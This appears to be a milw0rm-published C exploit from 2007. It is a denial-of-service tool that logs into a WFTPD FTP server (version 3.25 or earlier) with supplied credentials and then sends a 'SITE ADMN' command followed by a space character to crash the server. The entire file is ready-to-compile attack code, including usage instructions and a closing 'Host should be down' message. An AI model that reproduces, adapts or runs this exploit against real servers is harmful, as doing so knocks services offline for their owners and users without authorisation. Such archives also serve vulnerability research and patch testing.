/************************************************************************
*WFTPD server <= 3.25 SITE ADMN DoS                                     *
*                                                                       *
*Sending command SITE ADMN + \32 makes server BOOM                      *
*                                                                       *
*usage: wftpd_dos.exe ip port user pass                                 *
*                                                                       *
*Coded by Marsu <Marsupilamipowa@hotmail.fr>                            *
************************************************************************/

#include "winsock2.h"
#include "stdio.h"
#include "stdlib.h"
#pragma comment(lib, "ws2_32.lib")

int main(int argc, char* argv[])
{
	struct hostent *he;
	struct sockaddr_in sock_addr;
	WSADATA wsa;
	int ftpsock;
	char recvbuff[1024];
	char evilbuff[100];
	int buflen=100;

	if (argc!=5)
	{
		printf("[+] Usage: %s <ip> <port> <user> <pass>\n",argv[0]);
		return 1;
	}
	WSACleanup();
	WSAStartup(MAKEWORD(2,0),&wsa);

	printf("[+] Connecting to %s:%s ... ",argv[1],argv[2]);
	if ((he=gethostbyname(argv[1])) == NULL) {
		printf("Failed\n[-] Could not init gethostbyname\n");
		return 1;
	}
	if ((ftpsock = socket(PF_INET, SOCK_STREAM, 0)) == -1) {
		printf("Failed\n[-] Socket error\n");
		return 1;
	}

	sock_addr.sin_family = PF_INET;
	sock_addr.sin_port = htons(atoi(argv[2]));
	sock_addr.sin_addr = *((struct in_addr *)he->h_addr);
	memset(&(sock_addr.sin_zero), '\0', 8);
	if (connect(ftpsock, (struct sockaddr *)&sock_addr, sizeof(struct sockaddr)) == -1) {
		printf("Failed\n[-] Sorry, cannot connect to %s:%s. Error: %i\n", argv[1],argv[2],WSAGetLastError());
		return 1;
	}
	printf("OK\n");
	memset(recvbuff,'\0',1024);
	recv(ftpsock, recvbuff, 1024, 0);

	memset(evilbuff,'\0',buflen);
	memcpy(evilbuff,"USER ",5);
	memcpy(evilbuff+5,argv[3],strlen(argv[3]));
	memcpy(evilbuff+5+strlen(argv[3]),"\r\n\0",3);
	printf("[+] Sending USER ... ");
	if (send(ftpsock,evilbuff,strlen(evilbuff),0)==-1) {
		printf("Failed\n[-] Could not send\n");
		return 1;
	}
	printf("OK\n");
	memset(recvbuff,'\0',1024);
	recv(ftpsock, recvbuff, 1024, 0);

	memset(evilbuff,'\0',buflen);
	memcpy(evilbuff,"PASS ",5);
	memcpy(evilbuff+5,argv[4],strlen(argv[4]));
	memcpy(evilbuff+5+strlen(argv[4]),"\r\n\0",3);

	printf("[+] Sending PASS ... ");
	if (send(ftpsock,evilbuff,strlen(evilbuff),0)==-1) {
		printf("Failed\n[-] Could not send\n");
		return 1;
	}
	printf("OK\n");
	recv(ftpsock, recvbuff, 1024, 0);

	memset(evilbuff,'\0',buflen);
	memcpy(evilbuff,"SITE ADMN ",10);
	memset(evilbuff+10,32,1);			//this char is powerfull :p
	memcpy(evilbuff+10+1,"\r\n\0",3);

	printf("[+] Sending SITE ADMN ... ");
	if (send(ftpsock,evilbuff,strlen(evilbuff),0)==-1) {
		printf("Failed\n[-] Could not send\n");
		return 1;
	}
	printf("OK\n");

	printf("[+] Host should be down\n");
	return 0;
}

// milw0rm.com [2007-01-14]
